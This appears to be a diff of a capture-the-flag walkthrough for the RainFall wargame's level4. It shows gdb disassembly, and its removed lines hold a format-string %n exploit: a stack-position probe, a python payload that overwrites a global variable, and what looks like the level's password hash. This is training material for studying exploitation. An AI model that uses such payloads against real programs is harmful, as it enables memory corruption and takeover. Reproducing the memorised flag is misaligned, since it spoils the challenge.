@@ -1,7 +1,3 @@
-info variable
-0x08049810  m
-
-
 (gdb) disas main
 Dump of assembler code for function main:
    0x080484a7 <+0>:		push   %ebp
@@ -11,6 +7,8 @@ Dump of assembler code for function main:
    0x080484b2 <+11>:	leave  
    0x080484b3 <+12>:	ret    
 End of assembler dump.
+
+
 (gdb) disas n
 Dump of assembler code for function n:
    0x08048457 <+0>:		push   %ebp
@@ -33,6 +31,8 @@ Dump of assembler code for function n:
    0x080484a5 <+78>:	leave  
    0x080484a6 <+79>:	ret    
 End of assembler dump.
+
+
 (gdb) disas p
 Dump of assembler code for function p:
    0x08048444 <+0>:		push   %ebp
@@ -40,27 +40,7 @@ Dump of assembler code for function p:
    0x08048447 <+3>:		sub    $0x18,%esp
    0x0804844a <+6>:		mov    0x8(%ebp),%eax
    0x0804844d <+9>:		mov    %eax,(%esp)
-   0x08048450 <+12>:	call   0x8048340 <printf@plt>
+   0x08048450 <+12>:	call   0x8048340 <printf@plt>	; prints buffer
    0x08048455 <+17>:	leave  
    0x08048456 <+18>:	ret    
 End of assembler dump.
-
-There is a call to printf, when calling p() in n().
-It compares the variable n to 16930116, we can use the %n exploit like in level3.
-
-Let's find in which position does the m variable address starts.
-level4@RainFall:~$ ./level4 
-AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
-AAAA b7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
-
--> it is on the 12th position
-
-However, we can't write 16930116 characters, but we can play with the width parameter of printf.
-
--------------------------------
-m address: 0x08049810
-printing 16930112 char (16930116 - 4 bytes (m address))
-
-(python -c 'print ("\x10\x98\x04\x08" + "%16930112c" + "%12$n")') | ./level4
-
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
